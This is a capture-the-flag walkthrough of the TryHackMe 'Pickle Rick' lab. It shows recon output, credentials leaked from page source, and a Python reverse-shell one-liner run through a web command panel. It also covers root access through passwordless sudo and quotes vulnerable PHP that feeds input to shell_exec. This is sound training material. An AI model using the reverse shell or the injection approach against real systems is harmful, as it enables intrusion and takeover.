# THM Pickle Rick v2

## Description
This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.


## Reconnaise.
```
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6d:05:ac:46:6f:7b:bd:4e:64:81:f3:67:3d:11:3e:0e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqdKBB84/Sc9wCUzGIJwcp8GEwFvhpL7SQmJ1qTDROyiHqr2In/nLEG8tnCF8/zLoGLO/f+u/g0DrxpiRL5ihetRFWOvXRyo6kouA5+c7DAiLLKjQznPFWY77MUXPjXKah0Bz3jVf4srsxYBr6yJhfA6JiP8PmG0ebT/JNjJaQCOMHtszALvQryywU0sKEz6XIoa3jay1EsGqRwnfoM91R1UWhRRYQAZbH7OzSJz9EODAZ6eaUHNR7BV8HbYD//rJgjlSPvXZuFVbTWFzmTcNW97ZszJy+RwewEw5GdDBMorcIPe1vDyDmDvjK/vLaWA/fO9mzcgoPjo947zZ5nQswmXVQEzT5y4akP4l+sjjGD/9bMLQBzrYWF9OFVMf5h/1lobPOPze5k0HTa2NNj8WRaYXHOyUoXOTsu9UWTLUR3QeKOvhDgdvcVDS9Qhq/5wTRj1Y2QpJgc5/0vel+RMhhAqpmRuGBZjyTE8eoeyPE70sT9O5eYY/IXQIi100TCEk=
|   256 73:24:5e:95:5d:80:52:7c:67:3f:16:7c:a5:0b:32:f2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBImWa22tQclNuXXc8Tu0IL11R4U1T1/8y0YnjC/v+CjCM2WMtPuZ5et/s2aeBl79XacOceF6+JLdRDzFaI46d3E=
|   256 d7:7d:9f:e2:6d:be:5f:a8:8f:95:cd:43:2d:f0:e5:c5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN3qS2aG+7wxKAVEqvYMELfu1f4vhDZVpoX3fQfzNHKj
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Rick is sup4r cool
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Scanning and Enumeration
### Website
Early scanning to `/robots.txt` show all the directory list below.
```
Wubbalubbadubdub
```
Read the source code for `/index.html` reveal username for webserver user in comment part.

![image](https://hackmd.io/_uploads/Syuc2i5FC.png)


```
  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```
Possible crendetial gains from the webserver.
`R1ckRul3s:Wubbalubbadubdub`

### Gobuster Result
Further enumeration on directory using gobuster reveal 3 news endpoints.

```
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/login.php            (Status: 200) [Size: 882]
/assets               (Status: 301) [Size: 313] [--> http://10.10.10.208/assets/]
/index.html           (Status: 200) [Size: 1062]

```


## Initial Access
Using credential to gain access to webserver at `/login.php` redirect to `portal.php` once login. 
![image](https://hackmd.io/_uploads/HJvqasctA.png)

`/portal.php`
![image](https://hackmd.io/_uploads/BJroai5FA.png)


### Command to RCE 
Playing around with command panel. 
> As conclude, we can use ls, but to read file only can use less.

To see what else can do, visit binary `/usr/bin` to get more idea and further exploitation.

```
perl
python3
python3.8

```
Since the avaibility of command to execute, prepare the payload to make reverse shell. 

```
export RHOST="LocalMachine";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```
Setup listening and execute the command..

![image](https://hackmd.io/_uploads/SkA0AiqFR.png)

![image](https://hackmd.io/_uploads/rk8lk2cYR.png)


## PrivEsca
Using sudo -l to check user privilege. It can access root without password for ALL.

```
User www-data may run the following commands on ip-10-10-10-208:
    (ALL) NOPASSWD: ALL
```

Get root access without any password.

![image](https://hackmd.io/_uploads/B1kDJ39K0.png)

    
## Bonus
Filtering command in `/portal.php`

```
  // Cant use cat
      $cmds = array("cat", "head", "more", "tail", "nano", "vim", "vi");
      if(isset($_POST["command"])) {
        if(contains($_POST["command"], $cmds)) {
          echo "</br><p><u>Command disabled</u> to make it hard for future <b>PICKLEEEE RICCCKKKK</b>.</p><img src='assets/fail.gif'>";
        } else {
          $output = shell_exec($_POST["command"]);
          echo "</br><pre>$output</pre>";
        }

```

Dangerous method `shell_exec` that will execute any command without validation or sanitation.



## Learning
Always read source page.
Command to RCE.

